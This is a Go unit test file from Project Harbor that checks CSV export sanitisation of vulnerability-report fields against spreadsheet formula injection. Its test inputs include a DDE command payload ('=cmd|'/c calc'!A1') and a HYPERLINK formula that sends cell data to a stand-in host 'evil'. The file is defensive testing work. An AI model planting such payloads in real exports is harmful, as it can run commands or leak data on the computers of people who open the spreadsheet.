// Copyright Project Harbor Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package export

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestSanitizeCSVCell(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"equals", "=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"},
		{"plus", "+1+1", "'+1+1"},
		{"minus", "-2+3", "'-2+3"},
		{"at_scoped_npm", "@evil/pkg", "'@evil/pkg"},
		{"tab", "\tx", "'\tx"},
		{"carriage_return", "\rx", "'\rx"},
		{"newline", "\nx", "'\nx"},
		{"hyperlink", `=HYPERLINK("http://evil/"&A1)`, `'=HYPERLINK("http://evil/"&A1)`},
		{"benign_package", "libssl1.1", "libssl1.1"},
		{"benign_version", "1.2.3", "1.2.3"},
		{"benign_cve", "CVE-2025-0001", "CVE-2025-0001"},
		{"empty", "", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, sanitizeCSVCell(tt.in), "sanitizeCSVCell(%q)", tt.in)
		})
	}
}

func TestDataSanitizeForCSV(t *testing.T) {
	d := Data{
		Repository:     "attacker/app",
		ArtifactDigest: "sha256:deadbeef",
		CVEId:          "CVE-2026-0001",
		Package:        "@evil/pkg",
		Version:        "=cmd|'/c calc'!A1",
		FixVersion:     "+1+1",
		Severity:       "High",
		CWEIds:         "-2+3",
		AdditionalData: `=HYPERLINK("http://evil/"&A1)`,
		ScannerName:    "Trivy",
	}
	d.sanitizeForCSV()
	assert.Equal(t, "'@evil/pkg", d.Package)
	assert.Equal(t, "'=cmd|'/c calc'!A1", d.Version)
	assert.Equal(t, "'+1+1", d.FixVersion)
	assert.Equal(t, "'-2+3", d.CWEIds)
	assert.Equal(t, `'=HYPERLINK("http://evil/"&A1)`, d.AdditionalData)
	// Benign fields are untouched.
	assert.Equal(t, "attacker/app", d.Repository)
	assert.Equal(t, "CVE-2026-0001", d.CVEId)
	assert.Equal(t, "Trivy", d.ScannerName)
}
